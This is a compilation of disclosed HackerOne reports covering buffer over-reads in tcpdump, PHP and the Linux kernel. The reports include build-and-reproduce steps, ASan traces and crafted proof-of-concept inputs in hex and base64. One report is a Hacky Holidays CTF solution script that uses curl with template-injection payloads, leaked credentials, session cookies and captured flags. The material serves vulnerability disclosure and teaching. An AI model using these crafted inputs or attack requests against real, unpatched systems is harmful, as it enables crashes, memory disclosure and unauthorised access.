  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3569==ABORTING
```

It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/83c64fce3a5226b080e535f5131a8a318f30e79b) that I (Bhargava Shastry) am the original reporter of the issue.

To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)

```
hello @turtle_shell @hackerone
```

If you have any further queries, please let me know.

Tracked as CVE-2017-13050: https://nvd.nist.gov/vuln/detail/CVE-2017-13050

## Impact

I believe that information disclosure is possible.

---

### [CVE-2017-13019:  The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print()](https://hackerone.com/reports/802896)

- **Report ID:** `802896`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @bags
- **Bounty:** - usd
- **Disclosed:** 2021-08-22T03:55:56.566Z
- **CVE(s):** CVE-2017-13019

**Vulnerability Information:**

Hello,

The vulnerable code portion is linked below. The linked function is responsible for printing PGM packet payload information to the terminal (e.g., stdout)

https://github.com/the-tcpdump-group/tcpdump/commit/4601c685e7fd19c3724d5e499c69b8d3ec49933e

The issue may be reproduced as follows

Check out vulnerable tcpdump commit (< 4.9.2) as follows

```
$ git clone -b 26a6799b9ca80508c05cac7a9a3bef922991520b https://github.com/the-tcpdump-group/tcpdump
```

Build it with afl and AddressSanitizer as follows (please install libpcap before this step)

```
$ CC=afl-gcc
$ AFL_USE_ASAN=1 make -j
```

Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/4601c685e7fd19c3724d5e499c69b8d3ec49933e/tests/pgm_opts_asan_2.pcap?raw=true)

```
$ tcpdump -nvr <payload>
reading from file /tmp/pgm_opts_asan_2.pcap, link-type EN10MB (Ethernet)
=================================================================
==3947==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60800000007d at pc 0x5560b85896f6 bp 0x7ffe420b1ca0 sp 0x7ffe420b1c90
READ of size 4 at 0x60800000007d thread T0
    #0 0x5560b85896f5 in EXTRACT_32BITS extract.h:190
    #1 0x5560b85896f5 in pgm_print print-pgm.c:697
    #2 0x5560b849f20c in ip_print_demux print-ip.c:483
    #3 0x5560b849f20c in ip_print print-ip.c:658
    #4 0x5560b84506df in ethertype_print print-ether.c:334
    #5 0x5560b84531d1 in ether_print print-ether.c:237
    #6 0x5560b84531d1 in ether_if_print print-ether.c:262
    #7 0x5560b83b76be in pretty_print_packet print.c:332
    #8 0x5560b839062d in print_packet tcpdump.c:2590
    #9 0x5560b8663ee8 in pcap_offline_read savefile.c:561
    #10 0x5560b8652e5e in pcap_loop pcap.c:2737
    #11 0x5560b8383fed in main tcpdump.c:2093
    #12 0x7f7aaf546b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
    #13 0x5560b838c009 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17c009)

0x60800000007f is located 0 bytes to the right of 95-byte region [0x608000000020,0x60800000007f)
allocated by thread T0 here:
    #0 0x7f7aafc0ab50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
    #1 0x5560b8664c7a in pcap_check_header sf-pcap.c:404

SUMMARY: AddressSanitizer: heap-buffer-overflow extract.h:190 in EXTRACT_32BITS
Shadow bytes around the buggy address:
  0x0c107fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c107fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c107fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c107fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c107fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c107fff8000: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00[07]
  0x0c107fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c107fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c107fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c107fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c107fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3947==ABORTING
```

It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/4601c685e7fd19c3724d5e499c69b8d3ec49933e) that I (Bhargava Shastry) am the original reporter of the issue.

To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)

```
hello @turtle_shell @hackerone
```

If you have any further queries, please let me know.

Tracked as CVE-2017-13019: https://nvd.nist.gov/vuln/detail/CVE-2017-13019

## Impact

I believe that information disclosure is possible.

---

### [CVE-2020-9383 Floppy OOB read](https://hackerone.com/reports/891846)

- **Report ID:** `891846`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @jordyzomer
- **Bounty:** 750 usd
- **Disclosed:** 2021-08-22T03:22:28.117Z
- **CVE(s):** CVE-2020-9383

**Vulnerability Information:**

A vulnerability was found in Linux Kernel up to 5.5.6 (Operating System) and classified as critical. Affected by this issue is the function `set_fdc` of the file `drivers/block/floppy.c`. The manipulation with an unknown input leads to a memory corruption vulnerability (Out-of-Bounds). Using CWE to declare the problem leads to CWE-125. Impacted is confidentiality, integrity, and availability.

The weakness was disclosed 02/25/2020 by Jordy Zomer (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-9383 since 02/24/2020. The attack needs to be approached locally. 

References:

http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00039.html
https://github.com/torvalds/linux/commit/2e90ca68b0d2f5548804f22f0dd61145516171e3
https://security.netapp.com/advisory/ntap-20200313-0003/

## Impact

A local attacker could use this to cause a denial of service (system crash) or expose sensitive information.

---

### [CVE-2017-13040 The MPTCP parser in tcpdump before 4.9.2 has a buffer over-read in print-mptcp.c, several functions.](https://hackerone.com/reports/964582)

- **Report ID:** `964582`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @karas
- **Bounty:** 500 usd
- **Disclosed:** 2021-07-09T20:15:02.480Z
- **CVE(s):** CVE-2017-13040

**Vulnerability Information:**

## Description:
Versions of tcpdump before 4.9.2 are vulnerable to a buffer over-read in print-mptcp.c. This vulnerability was disclosed to the tcpdump maintainers and was recently patched in version 4.9.2 and disclosed as (CVE-2017-13040).

Patch: https://github.com/the-tcpdump-group/tcpdump/commit/4c3aee4bb0294c232d56b6d34e9eeb74f630fe8c

This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends on the specific network protocol if the crafted packet(s) may be sent from the local segment only or from a remote Internet host.

## Impact

If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the heap buffer is filled with data supplied from an untrusted user then that user can corrupt the memory in such a way as to inject executable code into the running program and take control of the process. This is one of the oldest and more reliable methods for attackers to gain unauthorized access to a computer.

---

### [CVE-2017-13041 The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_nodeinfo_print().](https://hackerone.com/reports/964583)

- **Report ID:** `964583`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @karas
- **Bounty:** 500 usd
- **Disclosed:** 2021-07-09T20:12:17.961Z
- **CVE(s):** CVE-2017-13041

**Vulnerability Information:**

## Description:
Versions of tcpdump before 4.9.2 are vulnerable to a buffer over-read in print-icmp6.c. This vulnerability was disclosed to the tcpdump maintainers and was recently patched in version 4.9.2 and disclosed as (CVE-2017-13041).

Patch: https://github.com/the-tcpdump-group/tcpdump/commit/f4b9e24c7384d882a7f434cc7413925bf871d63e

This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends on the specific network protocol if the crafted packet(s) may be sent from the local segment only or from a remote Internet host.

## Impact

If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the heap buffer is filled with data supplied from an untrusted user then that user can corrupt the memory in such a way as to inject executable code into the running program and take control of the process. This is one of the oldest and more reliable methods for attackers to gain unauthorized access to a computer.

---

### [h1 hacky holidays CTF solution](https://hackerone.com/reports/1065517)

- **Report ID:** `1065517`
- **Severity:** Critical
- **Weakness:** Buffer Over-read
- **Program:** h1-ctf
- **Reporter:** @erbbysam
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:24:38.757Z
- **CVE(s):** -

**Vulnerability Information:**

Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):
```
echo "Flag 1 -- robots.txt"
curl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag

echo ""
echo "Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )"
diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"

echo ""
echo "Flag 3 -- /people-rater"
curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag

echo ""
echo "Flag 4 -- /swag-shop"
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag

echo ""
echo "Flag 5 -- /secure-login (access:computer)"
wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
cat flag.txt
rm my_secure_files_not_for_you.zip
rm flag.txt
rm xxx.png

echo ""
echo "Flag 6 -- /my-diary"
curl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag

echo ""
echo "flag 7 -- /hate-mail-generator"
curl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}' 2>/dev/null | grep flag


echo ""
echo "flag 8 -- /forum (grinch:BahHumbug)"
curl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2>/dev/null | grep flag

echo ""
echo "flag 9 -- /evil-quiz"
curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag

echo ""
echo "flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)"
curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2> /dev/null | grep flag

echo ""
echo "flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)"
curl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data "username=grinchadmin&password=s4nt4sucks" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag


echo ""
echo "flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)"
curl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
rm cookie.txt
```

output:
```
Flag 1 -- robots.txt
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}

Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )
<         h1_0 = 'la',
<         h1_1 = '}',
<         h1_2 = '',
<         h1_3 = 'f',
<         h1_4 = 'g',
<         h1_5 = '{b7ebcb75',
<         h1_6 = '8454-',
<         h1_7 = 'cfb9574459f7',
<         h1_8 = '-9100-4f91-';
<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);

Flag 3 -- /people-rater
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

Flag 4 -- /swag-shop
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

Flag 5 -- /secure-login (access:computer)
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

Flag 6 -- /my-diary
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>

flag 7 -- /hate-mail-generator
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>

flag 8 -- /forum (grinch:BahHumbug)
                    <div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>

flag 9 -- /evil-quiz
            <h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>

flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)
                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>

flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)
        <h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>

flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)
        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>
```

## Impact

critical, we must stop the Grinch!

---

### [Out of Bounds Memory Read in php_jpg_get16](https://hackerone.com/reports/665330)

- **Report ID:** `665330`
- **Severity:** Critical
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @sediruoksitsero
- **Bounty:** 1500 usd
- **Disclosed:** 2020-11-09T01:47:14.529Z
- **CVE(s):** CVE-2019-11040

**Vulnerability Information:**

I have found and reported an out of bounds memory read in PHP [php_jpg_get16]
When PHP EXIF extension is parsing EXIF information from an image, e.g. via exif_read_data() function, in PHP versions 7.1.x below 7.1.30, 7.2.x below 7.2.19 and 7.3.x below 7.3.6 it is possible to supply it with data what will cause it to read past the allocated buffer.
This has been fixed and assigned CVE-2019-11040
The bug report is here: https://bugs.php.net/bug.php?id=77988
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11040
https://nvd.nist.gov/vuln/detail/CVE-2019-11040

## Impact

This may lead to information disclosure or crash.

---

### [Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow](https://hackerone.com/reports/593229)

- **Report ID:** `593229`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @neural_x
- **Bounty:** 1500 usd
- **Disclosed:** 2020-10-12T10:51:39.074Z
- **CVE(s):** CVE-2019-11039

**Vulnerability Information:**

PHP upstream bug report: https://bugs.php.net/bug.php?id=78069

*Description:*
In _php_iconv_mime_decode() function in iconv.c, there's an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:
```
for (str_left = str_nbytes; str_left > 0; str_left--, p1++) {
```
Inside this for loop, it's possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two '?' characters while increasing p1 and decreasing str_left:
```
int qmarks = 2;
while (qmarks > 0 && str_left > 1) {
    if (*(++p1) == '?') {
        --qmarks;
    }
    --str_left;
}
```
If the while condition is stopped, it will proceed to the next condition that checks if the next character is '=' and if it is, p1 is increased again and str_left is decreased: 
```
if (*(p1 + 1) == '=') {
    ++p1;
    --str_left;
}
```
However, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to 'pretval' variable and if it doesn't error out, it will properly set scan_stat and break:
```
scan_stat = 12;
break;
```
The for loop is being run from start again, but before checking the condition 'str_left > 0', it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to 'pretval'.

*PoC:*
```
$ echo "53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2" | xxd -r -p - > poc

$ sha256sum poc
c471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc

$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents("poc"),2);'
=================================================================
==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460
READ of size 1 at 0x60d0000005a8 thread T0
    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965
    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409
    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690
...
```
This issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.

## Impact

Remote attacker can submit specially crafted MIME format message (email) which triggers the vulnerability in the parsing code when decoding MIME headers. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string. The exact behaviour depends on the content of the memory after 'str' buffer.

---

### [heap buffer overflow in phar_detect_phar_fname_ext](https://hackerone.com/reports/475499)

- **Report ID:** `475499`
- **Severity:** Critical
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @chihuahua
- **Bounty:** - usd
- **Disclosed:** 2020-10-10T03:51:12.341Z
- **CVE(s):** CVE-2019-9021

**Vulnerability Information:**

The original report is here  https://bugs.php.net/bug.php?id=77247

```txt
USE_ZEND_ALLOC=0 ./php-src-PHP-7.2.13/sapi/cli/php -r "var_dump(new Phar(file_get_contents('poc.phar'),0,'test.phar'));"
```
```txt
=================================================================
==44888==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60600001bf60 at pc 0x7f17ca1cf935 bp 0x7ffc7b01ac20 sp 0x7ffc7b01a3c8
READ of size 26 at 0x60600001bf60 thread T0
    #0 0x7f17ca1cf934  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x3e934)
    #1 0xf81430 in phar_detect_phar_fname_ext /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar.c:2011
    #2 0xf8479c in phar_split_fname /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar.c:2218
    #3 0xfc279e in zim_Phar___construct /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar_object.c:1178
    #4 0x223908e in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:907
    #5 0x223c022 in execute_ex /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:59765
    #6 0x2280678 in zend_execute /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:63776
    #7 0x1c4dc40 in zend_eval_stringl /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_execute_API.c:1083
    #8 0x1c4e1c0 in zend_eval_stringl_ex /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_execute_API.c:1124
    #9 0x228d5bf in do_cli /home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php_cli.c:1042
    #10 0x472cc9 in main /home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php_cli.c:1403
    #11 0x7f17c810c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x473308 in _start (/home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php+0x473308)

0x60600001bf60 is located 0 bytes to the right of 64-byte region [0x60600001bf20,0x60600001bf60)
allocated by thread T0 here:
    #0 0x7f17ca229961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x1b688c0 in __zend_realloc /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_alloc.c:2845

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ??
Shadow bytes around the buggy address:
  0x0c0c7fffb790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c0c7fffb7e0: fa fa fa fa 00 00 00 00 00 00 00 00[fa]fa fa fa
  0x0c0c7fffb7f0: 00 00 00 00 00 00 00 06 fa fa fa fa 00 00 00 00
  0x0c0c7fffb800: 00 00 06 fa fa fa fa fa 00 00 00 00 00 00 00 fa
  0x0c0c7fffb810: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa
  0x0c0c7fffb820: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
  0x0c0c7fffb830: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==44888==ABORTING
```

## Impact

Heap buffer over read

---

### [Invalid Read on exif_process_SOFn](https://hackerone.com/reports/510025)

- **Report ID:** `510025`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @chamal
- **Bounty:** - usd
- **Disclosed:** 2020-10-10T02:17:08.150Z
- **CVE(s):** CVE-2019-9640

**Vulnerability Information:**

This  bug is present in exif_scan_thumbnail method of ext/exif/exif.c file.

Detailed description and steps to reproduce for this bug is present in bug report submitted to php.net.
Bug Report : https://bugs.php.net/bug.php?id=77540
PHP version : 7.1.26
CVE-ID : 2019-9640

## Impact

This bug may allow an attacker to read unintended data from memory.

---

### [Heap Buffer Overflow (READ: 4) in phar_parse_pharfile](https://hackerone.com/reports/477344)

- **Report ID:** `477344`
- **Severity:** High
- **Weakness:** Buffer Over-read
- **Program:** Internet Bug Bounty
- **Reporter:** @cy1337
- **Bounty:** - usd
- **Disclosed:** 2020-10-10T01:00:02.500Z
- **CVE(s):** CVE-2018-20783

**Vulnerability Information:**

Phar files with __HALT_COMPILER(); in unexpected places can lead to a buffer overrun. This is something I found while fuzzing with AFL using an ASAN instrumented PHP.

The issue can be observed by disabling the ZEND allocator and using ASAN (or valgrind/etc?) with a crafted phar as input. I have prepared an example PHAR file *php-oob4.phar*
```
USE_ZEND_ALLOC=0 php -d phar.readonly=0 -r "var_dump(new Phar('php-oob4.phar',0,'project.phar'));"
```
Base64 encoding of *php-oob4.phar* is as follows:
```
X19IQUxUX0NPTVBJTEVSKCk7CgAAANQpRbJAlS4oDzkKFD1B2bK4fX3DAgAAAEdCTUI=
```

OUTPUT
====
The following ASAN report was generated from this test case:
```
=================================================================
==2741==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000ab7a at pc 0x0000013258a7 bp 0x7ffd845ab330 sp 0x7ffd845ab328
READ of size 4 at 0x60200000ab7a thread T0
    #0 0x13258a6 in phar_parse_pharfile /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2
    #1 0x13258a6 in phar_open_from_fp /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1708
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7
    #7 0x1c15f56 in zend_execute /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:63776:2
    #8 0x1a07225 in zend_eval_stringl /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1083:4
    #9 0x1a07d6a in zend_eval_stringl_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1124:11
    #10 0x1a07d6a in zend_eval_string_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_execute_API.c:1135
    #11 0x200c501 in do_cli /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1042:8
    #12 0x200960c in main /home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php_cli.c:1404:18
    #13 0x7f21462e082f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
    #14 0x43a598 in _start (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x43a598)

0x60200000ab7a is located 0 bytes to the right of 10-byte region [0x60200000ab70,0x60200000ab7a)
allocated by thread T0 here:
    #0 0x4da6c8 in __interceptor_malloc (/home/cyoung/php-fuzzing/php-src-php-7.2.12/sapi/cli/php+0x4da6c8)
    #1 0x192899c in __zend_malloc /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_alloc.c:2829:14
    #2 0x131a6c1 in phar_create_or_parse_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1343:7
    #3 0x1318503 in phar_open_or_create_filename /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:1316:9
    #4 0x1341705 in zim_Phar___construct /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar_object.c:1195:6
    #5 0x1dc6cbb in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:907:4
    #6 0x1c15505 in execute_ex /home/cyoung/php-fuzzing/php-src-php-7.2.12/Zend/zend_vm_execute.h:59739:7

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/cyoung/php-fuzzing/php-src-php-7.2.12/ext/phar/phar.c:973:2 in phar_parse_pharfile
Shadow bytes around the buggy address:
  0x0c047fff9510: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9520: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9530: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9540: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9550: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
